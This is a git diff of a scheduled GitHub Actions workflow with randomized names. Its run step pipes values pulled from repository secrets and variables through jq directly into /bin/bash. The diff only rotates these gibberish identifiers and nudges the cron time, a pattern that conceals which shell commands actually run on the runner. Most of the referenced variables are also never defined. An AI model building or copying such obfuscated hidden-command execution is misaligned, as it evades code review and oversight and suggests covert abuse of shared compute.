@@ -1,25 +1,22 @@
 name: youngroundyy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '36 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: youngroundyy
         env:
-          jzbto24: ${{ secrets.jzbto24 }}
+          gmpw6578: ${{ secrets.gmpw6578 }}
         run: |
-          echo $jzbto24 | jq -r .luuko37989 | /bin/bash
-          echo $jgom43 | jq -r .subky4 | /bin/bash
-          echo $pmxbu6946 | jq -r .ue40337 | /bin/bash
-          echo $qqodc3911 | jq -r .iph1 | /bin/bash
-          echo $kcoxj89978 | jq -r .wru7 | /bin/bash
-          echo $u23452 | jq -r .exhv0 | /bin/bash
-          echo $zn03790 | jq -r .fdxtp3514 | /bin/bash
+          echo $gmpw6578 | jq -r .jfp056 | /bin/bash
+          echo $qlh0418 | jq -r .vdoeh6616 | /bin/bash
+          echo $paisr9 | jq -r .tpsr9 | /bin/bash
+          echo $s760 | jq -r .owvw7988 | /bin/bash
+          echo $mcap9109 | jq -r .lrual20794 | /bin/bash
+          echo $fnhsw0 | jq -r .tzwo3 | /bin/bash
 
